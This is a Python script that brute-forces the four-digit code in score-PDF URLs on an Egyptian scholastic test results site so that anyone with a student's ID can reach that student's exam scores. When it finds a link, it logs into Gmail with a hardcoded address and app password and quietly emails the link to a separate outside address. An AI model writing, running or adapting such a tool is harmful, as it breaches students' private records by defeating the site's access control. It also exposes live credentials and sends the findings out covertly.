import requests
import webbrowser
from colorama import Fore
import os
import smtplib
def spammsg():
    limit = 10000
    number1= 0000
    m = input ("input 1 for est 1 and 2 for est 2 : ")
    if(m == "1"):
        est = "ESTI"
    elif(m=="2"):
        est = "ESTII"
    ez = input("input exam date example 202211 year 2022 month 11 ") 
    idd = input("input student id to search ") 
    date = input("input exam id ex 225 meaning year 2022 exam number 5 ")
    #gpass = input("input gmail password if u want email send if not leave empty ")
    i = 0
    
   
    response = requests.get("https://scores.egyptianscholastictest.com/202211/ESTI/612e54a35bed532694c54fef-xxxx223.pdf")
    if(response.status_code != 404):
        print("lol")

    elif(response.status_code == 404):
        os.system('cls')
        print(Fore.GREEN)
        print("I am Searching can take up to 1 hour based on the person secret code")
        print(Fore.RED)
        
        for i in range(limit):
            number1+=1
            number2= str(number1)
            number3= number2.zfill(4)
            msg = "https://scores.egyptianscholastictest.com/"+ez+"/"+est+"/"+idd+"-"+number3+date+".pdf"
            lol =requests.get(msg)
            print(msg)
            if(lol.status_code != 404):
                os.system('cls')
                print(Fore.GREEN+msg)
                print("Exam Secret code is : "+str(number3))
                gmail_user = 'ziyadfathi5@gmail.com'
                gmail_password = 'zivavsquabvsgjiw'

                sent_from = gmail_user
                to = ['mohalya3@gmail.com']
                subject = 'Link from Adham app'
                body = "The link has been found succeful here it is : \n"+msg

                email_text = """\
                From: %s
                To: %s
                Subject: %s

                %s
                """ % (sent_from, ", ".join(to), subject, body)

                try:
                    smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                    smtp_server.ehlo()
                    smtp_server.login(gmail_user, gmail_password)
                    smtp_server.sendmail(sent_from, to, email_text)
                    smtp_server.close()
                    print(Fore.BLUE)
                    print ("Email sent successfully!")
                    print(Fore.GREEN)
                   
                except Exception as ex:
                    print(Fore.RED)
                    print ("Something went wrong….",ex)
                    print(Fore.GREEN)
                                    
    
                input("Press Enter to open link")
                webbrowser.open(msg, new=2)
                input("Press Enter to exit")
                break        
spammsg()